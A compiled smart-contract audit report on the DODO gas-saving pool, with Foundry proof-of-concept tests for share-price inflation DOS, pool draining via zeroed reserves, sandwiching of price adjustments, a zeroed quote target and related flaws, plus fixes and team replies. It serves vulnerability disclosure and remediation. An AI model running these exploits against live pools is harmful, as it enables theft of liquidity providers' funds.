# Issue H-1: Share Price Inflation by First LP-er, Enabling DOS Attacks on Subsequent buyShares with Up to 1001x the Attacking Cost 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/55 

## Found by 
0xpep7, Bandit, Hama, cergyk, hash, osmanozdemir1, rvierdiiev, thank\_you
## Summary
The smart contract contains a critical vulnerability that allows a malicious actor to manipulate the share price during the initialization of the liquidity pool, potentially leading to a DOS attack on subsequent buyShares operations.

## Vulnerability Detail
The root cause of the vulnerability lies in the initialization process of the liquidity pool, specifically in the calculation of shares during the first deposit.
```solidity
// Findings are labeled with '<= FOUND'
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol
31:    function buyShares(address to)
        ...
57:            // case 1. initial supply
58:            // The shares will be minted to user
59:            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_) // <= FOUND
60:                ? DecimalMath.divFloor(quoteBalance, _I_)
61:                : baseBalance; // @audit-info mint shares based on min balance(base, quote)
62:            // The target will be updated
63:            _BASE_TARGET_ = uint112(shares);
            ...
82:    }
```

If the pool is empty, the smart contract directly sets the share value based on the minimium value of the base token  denominated value of the provided assets. This assumption can be manipulated by a malicious actor during the first deposit, leading to a situation where the LP pool token becomes extremely expensive.

### Attack Scenario
The attacker exploits the vulnerability during the initialization of the liquidity pool:

1. The attacker mints 1001 shares during the first deposit.

2. Immediately, the attacker sells back 1000 shares, ensuring to keep 1 wei via the `sellShares` function.

3. The attacker then donates a large amount (1000e18) of base and quote tokens and invokes the `sync()` routine to pump the base and quote reserves to 1001 + 1000e18.

4. The protocol users proceed to execute the `buyShares` function with a balance less than `attacker's spending * 1001`. The transaction reverts due to the `mintRatio` being kept below 1001 wad and the computed `shares` less than 1001 (line 71), while it needs a value >= 1001 to mint shares successfully.
```solidity
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol
31:    function buyShares(address to)
        ...
66:            // case 2. normal case
67:            uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);
68:            uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);
69:            uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio; // <= FOUND: mintRatio below 1001wad if input amount smaller than reserves * 1001
70:            // The shares will be minted to user
71:            shares = DecimalMath.mulFloor(totalSupply, mintRatio); // <= FOUND: the manipulated totalSupply of 1wei requires a mintRatio of greater than 1000 for a successful _mint()
            ...
82:    }
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol
294:    function _mint(address user, uint256 value) internal {
295:        require(value > 1000, "MINT_AMOUNT_NOT_ENOUGH"); // <= FOUND: next buyShares with volume less than 1001 x attacker balance will revert here
...
300:    }
```

5. The `_mint()` function fails with a "MINT_AMOUNT_NOT_ENOUGH" error, causing a denial-of-service condition for subsequent buyShares operations.

### POC
Apply the POC to `dodo-gassaving-pool/test/GPSTrader.t.sol` and run with `cd dodo-gassaving-pool && forge test --fork-url "https://rpc.flashbots.net" -vvv --mt test_mint1weiShares_DOSx1000DonationVolume` to check the result.

```solidity
// File: dodo-gassaving-pool/test/GPSTrader.t.sol
    function test_mint1weiShares_DOSx1000DonationVolume() public {
        GSP gspTest = new GSP();
        gspTest.init(
            MAINTAINER,
            address(mockBaseToken),
            address(mockQuoteToken),
            0,
            0,
            1000000,
            500000000000000,
            false
        );

        // Buy 1001 shares
        vm.startPrank(USER);
        mockBaseToken.transfer(address(gspTest), 1001);
        mockQuoteToken.transfer(address(gspTest), 1001 * gspTest._I_() / 1e18);
        gspTest.buyShares(USER);
        assertEq(gspTest.balanceOf(USER), 1001);

        // User sells shares and keep ONLY 1wei
        gspTest.sellShares(1000, USER, 0, 0, "", block.timestamp);
        assertEq(gspTest.balanceOf(USER), 1);

        // User donate a huge amount of base & quote tokens to inflate the share price
        uint256 donationAmount = 1000e18;
        mockBaseToken.transfer(address(gspTest), donationAmount);
        mockQuoteToken.transfer(address(gspTest), donationAmount * gspTest._I_() / 1e18);
        gspTest.sync();
        vm.stopPrank();

        // DOS subsequent operations with roughly 1001 x donation volume
        uint256 dosAmount = donationAmount * 1001;
        mockBaseToken.mint(OTHER, type(uint256).max);
        mockQuoteToken.mint(OTHER, type(uint256).max);

        vm.startPrank(OTHER);
        mockBaseToken.transfer(address(gspTest), dosAmount);
        mockQuoteToken.transfer(address(gspTest), dosAmount * gspTest._I_() / 1e18);

        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gspTest.buyShares(OTHER);
        vm.stopPrank();
    }
```

A PASS result would confirm that any deposits with volume less than 1001 times to attacker cost would fail. That means by spending $1000, the attacker can DOS any transaction with volume below $1001,000.


## Impact
The impact of this vulnerability is severe, as it allows an attacker to conduct DOS attacks on buyShares with a low attacking cost (retrievable for further attacks via `sellShares`). This significantly impairs the core functionality of the protocol, potentially preventing further LP operations and hindering the protocol's ability to attract Total Value Locked (TVL) for other trading operations such as sellBase, sellQuote and flashloan.

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L56-L65

## Tool used
Foundry test

## Recommendation
A mechanism should be implemented to handle the case of zero totalSupply during initialization. A potential solution is inspired by [Uniswap V2 Core Code](https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L119-L124), which sends the first 1001 LP tokens to the zero address. This way, it's extremely costly to inflate the share price as much as 1001 times on the first deposit.

```patch
// File: dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol
31:    function buyShares(address to)
        ...
56:        if (totalSupply == 0) {
57:            // case 1. initial supply
58:            // The shares will be minted to user
59:            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)
60:                ? DecimalMath.divFloor(quoteBalance, _I_)
61:                : baseBalance; 
+             _mint(address(0), 1001); // permanently lock the first MINIMUM_LIQUIDITY of 1001 tokens, makes it imposible to manipulate the totalSupply to 1 wei
...
``` ...
```

# Issue H-2: Liquidity incentive for depositing liquidity is wrong 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/110 

## Found by 
mstpr-brainbot
## Summary
When users deposits tokens to mint shares the incentive for providing the scarce token is not existing. Contrary, the incentive is given to the most amounted token which incentives users to deposit the token that has more in the pool. 
## Vulnerability Detail
Let's consider an example where a pool initially has 100-100 tokens at time t=0, with a total of 100 shares in totalSupply, representing perfect equilibrium.

After several trades, the token balances in the pool change to 20-180, indicating that the base token is scarce while the quote token is in abundance within the pool. This situation should ideally incentivize users to deposit base tokens in order to receive more LP tokens since the pool is not in equilibrium. However, this doesn't occur due to the way the share calculation operates when a user deposits tokens into the pool:
```solidity
uint256 baseInputRatio = DecimalMath.divFloor(baseInput, baseReserve);
uint256 quoteInputRatio = DecimalMath.divFloor(quoteInput, quoteReserve);
uint256 mintRatio = quoteInputRatio < baseInputRatio ? quoteInputRatio : baseInputRatio;
// The shares will be minted to user
shares = DecimalMath.mulFloor(totalSupply, mintRatio);
```
As observed, the lowest ratio is chosen. Considering we had 20-180 tokens in the pool, if a user intends to deposit a total of 100 tokens, what would be the optimal deposit strategy? Depositing 90 base and 10 quote tokens would increase the base tokens and move the pool towards equilibrium. Let's see how many shares the user would receive by depositing 90-10:

mintRatio = min(90/20, 10/180)
= 10/180

10/180 * 100 = 5.55 shares.

Now, what if the user deposits liquidity in reverse, with 10 base tokens and 90 quote tokens?

mintRatio = min(10/20, 90/180)
= 1/2

1/2 * 100 = 50 shares!

Thus, depositing 10-90, despite the pool having significantly more quote tokens, would grant the user nearly 10 times more shares. Users incentivized to provide liquidity deviate the pool further from its balanced state, which contradicts the pool's equilibrium!

Here a coded PoC:
```solidity
function test_DepositInFavourOfThePool() external {
        // tapir deposits 100-100 to initiate the pool
        // assume the pool has 20-180, dont want to do sells to further complexify the issue
        // so I'll start the pool with 20-180 from start. 
        vm.startPrank(tapir);
        dai.safeTransfer(address(gsp), 20 * 1e18);
        usdc.transfer(address(gsp), 180 * 1e6);
        gsp.buyShares(tapir);
        
        // deposit 90 base and 10 quote, which is better for the pools equilibrum
        dai.safeTransfer(address(gsp), 90 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        (uint256 shares, , ) = gsp.buyShares(tapir);

        console.log("Tapir received shares", shares);
        console.log("Tapir received shares human readable form", shares / 1e18);
    }

    function test_DepositNotInFavourOfThePool() external {
        // tapir deposits 100-100 to initiate the pool
        // assume the pool has 20-180, dont want to do sells to further complexify the issue
        // so I'll start the pool with 20-180 from start. 
        vm.startPrank(tapir);
        dai.safeTransfer(address(gsp), 20 * 1e18);
        usdc.transfer(address(gsp), 180 * 1e6);
        gsp.buyShares(tapir);
        
        // deposit 10 base and 90 quote, which is worse for the pools equilibrum
        dai.safeTransfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 90 * 1e6);
        (uint256 shares, , ) = gsp.buyShares(tapir);

        console.log("Tapir received shares", shares);
        console.log("Tapir received shares human readable form", shares / 1e18);
    }
```

Test result and logs:
<img width="501" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/334dba64-2a80-4a41-9344-80670aa8f438">

## Impact
High, since the pool is never incentivized to be in equilibrium when users provide liquidity. Depositing the scarce token should give the user a bonus on shares since the user helps the pool to reach its equilibrium.
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L31-L82
## Tool used

Manual Review

## Recommendation
Change the mintRatio calculation



## Discussion

**Skyewwww**

Pool price offset causes imbalance between base and quote ratio, we should add liquidity according to current ratio. 

**nevillehuang**

Hi @Skyewwww, I have some troubles understanding your comment on this, why would a pool incentivize adding liquidity on the lower liquidity token? Doesn't that break the intention of maintaining a balanced pool?

# Issue H-3: Pool can be drained if there are no LP_FEES 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/122 

## Found by 
cergyk, mstpr-brainbot
## Summary
The pool can be depleted because swaps allow the withdrawal of the entire balance, resulting in a reserve of 0 for a specific asset. When an asset's balance reaches 0, the PMMPricing algorithm incorrectly estimates the calculation of output amounts. Consequently, the entire pool can be exploited using a flash loan by depleting one of the tokens to 0 and then swapping back to the pool whatever is received.
## Vulnerability Detail
Firstly, as indicated in the summary, selling quote/base tokens can lead to draining the opposite token in the pool, potentially resulting in a reserve of 0. Consequently, the swapping mechanism permits someone to entirely deplete the token balance within the pool. In such cases, the calculations within the pool mechanism become inaccurate. Therefore, swapping back to whatever has been initially purchased will result in acquiring more tokens, further exacerbating the depletion of the pool.

Allow me to provide a PoC to illustrate this scenario:
```solidity
function test_poolCanBeDrained() public {
        // @review 99959990000000000000000 this amount makes the reserve 0
        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing
        // selling this amount to the pool will make the quote token reserves "0".
        vm.startPrank(tapir);
        uint256 _amount = 99959990000000000000000;

        //  Buy shares with tapir, 10 - 10 initiate the pool
        dai.transfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        gsp.buyShares(tapir);

        // make sure the values are correct with my math
        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);
        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);
        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);
        assertEq(gsp.balanceOf(tapir), 10 * 1e18);
        vm.stopPrank();
        
        // sell such a base token amount such that the quote reserve is 0
        // I calculated the "_amount" already which will make the quote token reserve "0"
        vm.startPrank(hippo);
        deal(DAI, hippo, _amount);
        dai.transfer(address(gsp), _amount);
        uint256 receivedQuoteAmount = gsp.sellBase(hippo);

        // print the reserves and the amount received by hippo when he sold the base tokens
        console.log("Received quote amount by hippo", receivedQuoteAmount);
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());

        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!
        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 
        // as a result of swapping or removing liquidity.
        assertEq(gsp._QUOTE_RESERVE_(), 0);

        // sell the quote tokens received back to the pool immediately
        usdc.transfer(address(gsp), receivedQuoteAmount);

        // cache whatever received base tokens from the selling back
        uint256 receivedBaseAmount = gsp.sellQuote(hippo);

        console.log("Received base amount by hippo", receivedBaseAmount);
        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        
        // whatever received in base tokens are bigger than our first flashloan! 
        // means that we have a profit!
        assertGe(receivedBaseAmount, _amount);
        console.log("Profit for attack", receivedBaseAmount - _amount);
    }
```

Test results and logs:
<img width="529" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/ac3f07f2-281f-485e-b8df-812045f8a88b">

## Impact
Pool can be drained, funds are lost. Hence, high. Though, this can only happen when there are no "LP_FEES". However, when we check the default settings of the deployment, we see [here](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/scripts/DeployGSP.s.sol#L22) that the LP_FEE is set to 0. So, it is ok to assume that the LP_FEES can be 0.

## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113
## Tool used

Manual Review

## Recommendation
Do not allow the pools balance to be 0 or do not let LP_FEE to be 0 in anytime.  

# Issue M-1: Adjusting "_I_" will create a sandwich opportunity because of price changes 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/40 

## Found by 
Bandit, cergyk, mstpr-brainbot
## Summary
Adjusting the value of "I" directly influences the price. This can be exploited by a MEV bot, simply by trading just before the "adjustPrice" function and exiting right after the price change. The profit gained from this operation essentially represents potential losses for the liquidity providers who supplied liquidity to the pool.
## Vulnerability Detail
As we can see in the docs, the "_I_" is the "i" value in here and it is directly related with the output amount a trader will receive when selling a quote/base token:
<img width="581" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/61930727-f8d0-4f47-8712-32d6ada95334">

Since the price will change, the MEV bot can simply sandwich the tx. Here an example how it can be executed by a MEV bot:

```solidity
function test_Adjusting_I_CanBeFrontrunned() external {
        vm.startPrank(tapir);

        //  Buy shares with tapir, 10 - 10
        dai.safeTransfer(address(gsp), 10 * 1e18);
        usdc.transfer(address(gsp), 10 * 1e6);
        gsp.buyShares(tapir);

        // print some stuff
        console.log("Base target initial", gsp._BASE_TARGET_());
        console.log("Quote target initial", gsp._QUOTE_TARGET_());
        console.log("Base reserve initial", gsp._BASE_RESERVE_());
        console.log("Quote reserve initial", gsp._QUOTE_RESERVE_());
        
        // we know the price will decrease so lets sell the base token before that
        uint256 initialBaseTokensSwapped = 5 * 1e18;

        // sell the base tokens before adjustPrice
        dai.safeTransfer(address(gsp), initialBaseTokensSwapped);
        uint256 receivedQuoteTokens = gsp.sellBase(tapir);
        vm.stopPrank();

        // this is the tx will be sandwiched by the MEV trader
        vm.prank(MAINTAINER);
        gsp.adjustPrice(999000);

        // quickly resell whatever gained by the price update
        vm.startPrank(tapir);
        usdc.safeTransfer(address(gsp), receivedQuoteTokens);
        uint256 receivedBaseTokens = gsp.sellQuote(tapir);
        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());
        console.log("Received base tokens", receivedBaseTokens);

        // NOTE: the LP fee and MT FEE is set for this example, so this is not an rough assumption
        // where fees are 0. Here the fees set for both of the values (default values):
        // uint256 constant LP_FEE_RATE = 10000000000000;
        // uint256 constant MT_FEE_RATE = 10000000000000;

        // whatever we get is more than we started, in this example
        // MEV trader started 5 DAI and we have more than 5 DAI!!
        assertGe(receivedBaseTokens, initialBaseTokensSwapped);
    }
```
Test result and logs:
<img width="435" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/2c90a84e-7fba-47ef-8fe9-bbcd36a65268">

After the sandwich, we can see that the MEV bot's DAI amount exceeds its initial DAI balance (profits). Additionally, the reserves for both base and quote tokens are less than the initial 10 tokens deposited by the tapir (only LP). The profit gained by the MEV bot essentially translates to a loss for the tapir.

Another note on this is that even though the `adjustPrice` called by MAINTAINER without getting frontrunned, it still creates a big price difference which requires immediate arbitrages. Usually these type of parameter changes that impacts the trades are setted by time via ramping to mitigate the unfair advantages that it can occur during the price update.
## Impact
Medium since the adjusting price is a privileged role and it is not frequently used. However, this tx can be frontrunnable easily as we see in the PoC which would result in loss of funds. Although the admins are trusted this is not about admin being trustworthy. This is basically a common DeFi parameter change thread and should be well awared. For example, in curve/yeth/balancer contracts the ramp factors are changed via async slow update. It doesn't changes its value immediately but rather does this update slowly by every sec. For example we can see here in the yETH contract that the changing a parameter which determines the trades of users is updated slowly rather than one go:
https://github.com/yearn/yETH/blob/8d831fd6b4de9f004d419f035cd2806dc8d5cf7e/contracts/Pool.vy#L983-L997
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol#L169-L174
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40-L113
## Tool used

Manual Review

## Recommendation
Acknowledge the issue and use private RPC's to eliminate front-running or slowly ramp up the "I" so that the arbitrage opportunity is fair



## Discussion

**Skyewwww**

We think this is normal arbitrage behavior and not a bug.

**nevillehuang**

@Skyewwww Since this wasn't mention as an intended known risk, I will maintain as medium severity.

# Issue M-2: First depositor can lock the quote target value to zero 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/48 

## Found by 
hash, mstpr-brainbot, nuthan2x
## Summary
When the initial deposit occurs, it is possible for the quote target to be set to 0. This situation significantly impacts other LPs as well. Even if subsequent LPs deposit substantial amounts, the quote target remains at 0 due to multiplication with this zero value. 0 _QUOTE_TARGET_ value will impact the swaps that pool facilities
## Vulnerability Detail
When the first deposit happens, _QUOTE_TARGET_ is set as follows:
```solidity
 if (totalSupply == 0) {
            // case 1. initial supply
            // The shares will be minted to user
            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)
                ? DecimalMath.divFloor(quoteBalance, _I_)
                : baseBalance;
            // The target will be updated
            _BASE_TARGET_ = uint112(shares);
            _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));
```

In this scenario, the 'shares' value can be a minimum of 1e3, as indicated here: [link to code snippet](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPVault.sol#L295).

This implies that if someone deposits minuscule amounts of quote token and base token, they can set the _QUOTE_TARGET_ to zero because the `mulFloor` operation uses a scaling factor of 1e18:

```solidity
function mulFloor(uint256 target, uint256 d) internal pure returns (uint256) {
        return target * d / (10 ** 18);
    }
```

Should the quote target become 0, subsequent deposits will not increase due to the multiplication with "0" on the quote target. This situation is highly problematic because the swaps depend on the value of the quote target:
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L74-L75
```solidity
// @review 0 + (0 * something) = 0! doesn't matter what amount has been deposited !
_QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_) + (DecimalMath.mulFloor(uint256(_QUOTE_TARGET_), mintRatio)));
```

Here a PoC shows that if the first deposit is tiny the _QUOTE_TARGET_ is 0. Also, whatever deposits after goes through the _QUOTE_TARGET_ still 0 because of the multiplication with 0! 

```solidity
function test_StartWithZeroTarget() external {
        // tapir deposits tiny amounts to make quote target 0
        vm.startPrank(tapir);
        dai.safeTransfer(address(gsp), 1 * 1e5);
        usdc.transfer(address(gsp), 1 * 1e5);
        gsp.buyShares(tapir);

        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());

        // quote target is indeed 0!
        assertEq(gsp._QUOTE_TARGET_(), 0);

        vm.stopPrank();

        // hippo deposits properly
        vm.startPrank(hippo);
        dai.safeTransfer(address(gsp), 1000 * 1e18);
        usdc.transfer(address(gsp), 10000 * 1e6);
        gsp.buyShares(hippo);

        console.log("Base target", gsp._BASE_TARGET_());
        console.log("Quote target", gsp._QUOTE_TARGET_());
        console.log("Base reserve", gsp._BASE_RESERVE_());
        console.log("Quote reserve", gsp._QUOTE_RESERVE_());

        // although hippo deposited 1000 USDC as quote tokens, target is still 0 due to multiplication with 0
        assertEq(gsp._QUOTE_TARGET_(), 0);
    }
```

Test result and logs:
<img width="479" alt="image" src="https://github.com/sherlock-audit/2023-12-dodo-gsp-mstpr/assets/120012681/762c190b-f35c-4d2a-9bf2-9654b94dd119">

## Impact
Since the quote target is important and used when pool deciding the swap math I will label this as high.
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L31-L82
## Tool used

Manual Review

## Recommendation
According to the quote tokens decimals, multiply the quote token balance with the proper decimal scalor.



## Discussion

**Skyewwww**

When Q0=0, users can still call sellQuote which can be executed normally. When user calls sellBase, the target will be check. If target is not greater than 0, the transaction will be revert as we expected.
![image](https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/assets/113418260/8e54a7ec-0e07-4ff3-b4d7-97ea826ba9a7)
![image](https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/assets/113418260/32fceac1-1c00-4548-92e2-a52a20731e4b)


# Issue M-3: EIP712 chainId is hardcoded 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/113 

## Found by 
0xpep7, Chinmay, IvanFitro, PranavGarg, ZanyBonzy, hash, mstpr-brainbot, osmanozdemir1, pontifex, tpiliposian, ubl4nk
## Summary
Per EIP712, calculating the domain separator using a hardcoded chainId could pose problems. The reason is that if the chain undergoes a hard fork and changes its chain id, the domain separator will be inaccurately calculated. To avoid this issue, the domain separator should be dynamically calculated using the chainId opcode each time it is requested.
## Vulnerability Detail
As stated in the summary, hardcoding the chain ID is not a good practice when implementing EIP712. The best practice is to use a dynamically calculated DOMAIN_SEPARATOR, as suggested by OpenZeppelin.

 Here some previous findings in the space regards to this specific issue:
https://solodit.xyz/issues/eip712-domain_separator-stored-as-immutable-mixbytes-none-bebop-markdown
https://solodit.xyz/issues/m-05-replay-attack-in-case-of-hard-fork-code4rena-golom-golom-contest-git
## Impact
Medium, since this issue was previously counted as medium in various protocols and it can be an issue where permit can be used for infinite approvals if the hard fork chain id suits. Also, DODO deployed in various of chains so the thread of this happening is more likely 
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSP.sol#L86-L94
## Tool used

Manual Review

## Recommendation
build the domain separator dynamically with dynamic block.chainId in case of forks of the chain. Smith like this:
```solidity
function _buildDomainSeparator() private view returns (bytes32) {
        return keccak256(abi.encode(TYPE_HASH, _EIP712NameHash(), _EIP712VersionHash(), block.chainid, address(this)));
    }
```



## Discussion

**Skyewwww**

We think hardfork has a very low possibility. If a hardfork does happen, we will inform our user to not interact with the hardforked chain. Since calculate the hash dynamically will cost more gas, it It is not worth fixing for V2 but we will fix it in GSP.

**nevillehuang**

Since watsons highlighted a possible scenario where replay attacks can possibly happen which will have significant impact, leaving as medium severity seems appropriate.

**Skyewwww**

We fix this bug in this PR: https://github.com/DODOEX/dodo-gassaving-pool/pull/10

# Issue M-4: Division before multiplication can result to rounding errors 

Source: https://github.com/sherlock-audit/2023-12-dodo-gsp-judging/issues/116 

## Found by 
Varun\_05, mstpr-brainbot, zraxx
## Summary
Throughout the code there are some part of the code that does division before multiplication which could end up in loss of precision. 
## Vulnerability Detail
Let's take an example of this part of the code:
```solidity
uint256 part2 = k * (V0) / (V1) * (V0) + (i * (delta)); // kQ0^2/Q1-i*deltaB
```
so the above math is simply:
kQ^^2 / Q1 - (i * deltaB). So what we should be doing is first getting the square of the Q2 which is V0 in the above code and then multiply it by k. However, the code first does the k * V0 and then divides it to V1 and back to multiplication with V1. If the "k" value is significantly lesser than 1e18, then k * V0 / V1 can result on precision error and even in rounding to "0". 
Assume k = 1, V0 = 50 * 1e18 and V1 = 100 * 1e18, then the result would be:

1 * 50 * 1e18 / 100 * 1e18 = 0 in solidity. Which would result that the entire part2 to be calculated mistakenly. 

Also, we can see that the "k" value can be any value between 0 < 1e18 here:
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSP.sol#L58-L59

so the above scenario becomes realistic.
## Impact
Although having a "k" value 1 is not very realistic, it still can happen since the k is in range of 0 < 1e18, in such cases this rounding error will make the amounts to be calculated mistakenly. Hence, I'll label this as medium.
## Code Snippet
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/lib/DODOMath.sol#L83
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/lib/DODOMath.sol#L147
https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/af43d39f6a89e5084843e196fc0185abffe6304d/dodo-gassaving-pool/contracts/lib/DODOMath.sol#L159
## Tool used

Manual Review

## Recommendation
First multiply then divide throughout in the code



## Discussion

**nevillehuang**

Good job to watsons, all of the highlighted and gave an example of the possible precision loss from division before multiplication as required by sherlock guidelines, so medium severity seems appropriate.

